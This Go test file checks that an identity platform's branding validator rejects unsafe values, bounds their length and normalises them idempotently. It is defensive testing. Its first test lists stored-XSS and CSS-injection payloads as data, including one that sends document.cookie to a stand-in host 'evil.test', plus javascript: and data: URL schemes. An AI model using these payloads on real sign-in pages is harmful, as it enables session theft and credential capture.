/*
 * Authn Platform — Enterprise Identity Engine
 * File: apps/auth-engine/internal/appconfig/model_test.go
 * Tier: Domain Model Layer / Tests
 *
 * License: GNU AGPLv3 — Copyright (C) Authn Platform Authors
 */

package appconfig

import (
	"strings"
	"testing"
)

// TestValidateBrandingRejectsStyleBreakout covers the values that would turn a
// branding field into script execution on the sign-in page.
//
// Branding is rendered by the customer's own page, typically by interpolating the
// stylesheet into a <style> element and the colours into declarations. A value
// that can close the element or end the declaration is therefore a stored XSS in
// the one place a user is about to type their password. Each case here is a way
// out of that context.
func TestValidateBrandingRejectsStyleBreakout(t *testing.T) {
	cases := []struct {
		name      string
		branding  Branding
		wantField string
	}{
		{
			name:      "custom css closing the style element",
			branding:  Branding{CustomCSS: "body{}</style><script>fetch('//evil.test?c='+document.cookie)</script>"},
			wantField: "custom_css",
		},
		{
			name:      "custom css opening a tag",
			branding:  Branding{CustomCSS: "body{color:red}<img src=x onerror=alert(1)>"},
			wantField: "custom_css",
		},
		{
			name:      "font family ending the declaration",
			branding:  Branding{FontFamily: "Inter; behavior: url(evil.htc)"},
			wantField: "font_family",
		},
		{
			name:      "font family opening a block",
			branding:  Branding{FontFamily: "Inter} body{display:none"},
			wantField: "font_family",
		},
		{
			name:      "colour carrying a whole declaration",
			branding:  Branding{PrimaryColor: "red; background-image: url(//evil.test/x)"},
			wantField: "primary_color",
		},
		{
			name:      "logo url with a javascript scheme",
			branding:  Branding{LogoURL: "javascript:alert(1)"},
			wantField: "logo_url",
		},
		{
			name:      "terms url with a data scheme",
			branding:  Branding{TermsURL: "data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="},
			wantField: "terms_url",
		},
		{
			name:      "app name carrying markup",
			branding:  Branding{AppName: "<script>alert(1)</script>"},
			wantField: "app_name",
		},
	}

	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			_, err := ValidateBranding(tc.branding)
			if err == nil {
				t.Fatalf("ValidateBranding accepted %s, which would execute on the sign-in page", tc.name)
			}
			if !strings.Contains(err.Error(), tc.wantField) {
				t.Errorf("error should name the offending field %q, got: %v", tc.wantField, err)
			}
		})
	}
}

// TestValidateBrandingRejectsOversizedValues checks the length bounds. The values
// land in a JSON column read on every sign-in page load, so an unbounded one is
// paid for on every request rather than once at write time.
func TestValidateBrandingRejectsOversizedValues(t *testing.T) {
	cases := []struct {
		name     string
		branding Branding
	}{
		{"app name", Branding{AppName: strings.Repeat("a", maxAppNameLength+1)}},
		{"font family", Branding{FontFamily: strings.Repeat("a", maxFontFamilyLength+1)}},
		{"custom css", Branding{CustomCSS: strings.Repeat("a", maxCustomCSSLength+1)}},
	}

	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			if _, err := ValidateBranding(tc.branding); err == nil {
				t.Fatalf("an oversized %s must be rejected", tc.name)
			}
		})
	}
}

// TestValidateBrandingAcceptsAndNormalizesRealConfiguration checks that ordinary
// branding survives, and that validation is idempotent.
//
// Idempotence matters because the handler validates and the repository validates
// again as a safety net. A second pass that rejected or altered its own output
// would make every write fail on the way to storage.
func TestValidateBrandingAcceptsAndNormalizesRealConfiguration(t *testing.T) {
	input := Branding{
		AppName:         "  Acme Identity  ",
		LogoURL:         "https://cdn.acme.example/logo.svg",
		LogoDarkURL:     "cdn.acme.example/logo-dark.svg",
		FaviconURL:      "https://cdn.acme.example/favicon.ico",
		PrimaryColor:    " #1a73e8 ",
		BackgroundColor: "#fff",
		TextColor:       "#0f172aff",
		ButtonTextColor: "#FFFFFF",
		FontFamily:      "Inter, -apple-system, sans-serif",
		SupportURL:      "https://acme.example/support",
		TermsURL:        "https://acme.example/terms",
		PrivacyURL:      "https://acme.example/privacy",
		CustomCSS:       ".authn-card { box-shadow: 0 1px 2px rgba(0,0,0,.08) }",
	}

	first, err := ValidateBranding(input)
	if err != nil {
		t.Fatalf("ordinary branding must be accepted, got: %v", err)
	}

	if first.AppName != "Acme Identity" {
		t.Errorf("app_name should be trimmed, got %q", first.AppName)
	}
	if first.PrimaryColor != "#1a73e8" {
		t.Errorf("primary_color should be trimmed, got %q", first.PrimaryColor)
	}
	// A bare host is resolved to https rather than http, so a pasted URL is never
	// silently downgraded to cleartext.
	if first.LogoDarkURL != "https://cdn.acme.example/logo-dark.svg" {
		t.Errorf("a scheme-less URL should resolve to https, got %q", first.LogoDarkURL)
	}

	second, err := ValidateBranding(first)
	if err != nil {
		t.Fatalf("validation must be idempotent, second pass failed: %v", err)
	}
	if second != first {
		t.Errorf("second validation changed the value:\n first=%+v\nsecond=%+v", first, second)
	}
}

// TestValidateBrandingAcceptsEmpty checks that a tenant which has configured
// nothing is storable. Empty is the documented "inherit the client's defaults"
// state, so it must not be mistaken for fourteen missing required fields.
func TestValidateBrandingAcceptsEmpty(t *testing.T) {
	stored, err := ValidateBranding(DefaultBranding())
	if err != nil {
		t.Fatalf("empty branding must be accepted, got: %v", err)
	}
	if stored != (Branding{}) {
		t.Errorf("empty branding should stay empty, got %+v", stored)
	}
}
